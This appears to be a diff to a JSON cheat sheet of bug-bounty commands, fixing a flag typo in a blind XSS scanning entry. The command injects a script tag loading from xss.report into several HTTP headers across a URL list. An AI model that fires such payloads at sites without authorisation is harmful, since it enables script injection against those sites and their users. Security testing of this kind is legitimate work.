@@ -239,7 +239,7 @@
         "title": "BLIND XSS SCANNING",
         "subtitle": "Bxss tool is used to scan for blind xss <br>- For dorks use this page https://lostsec.xyz/coffin/dorking.html",
         "commands": [
-            "cat all_urls.txt | gf xss| uro | bxss -p '&lt;script src=https://xss.report/c/aceos&gt;&lt;/script&gt;' -H 'Referer' -header 'Origin' -H 'X-Forwarded-For' -H 'User-Agent'"
+            "cat all_urls.txt | gf xss| uro | bxss -p '&lt;script src=https://xss.report/c/aceos&gt;&lt;/script&gt;' -H 'Referer' -H 'Origin' -H 'X-Forwarded-For' -H 'User-Agent'"
         ]
     },
     {
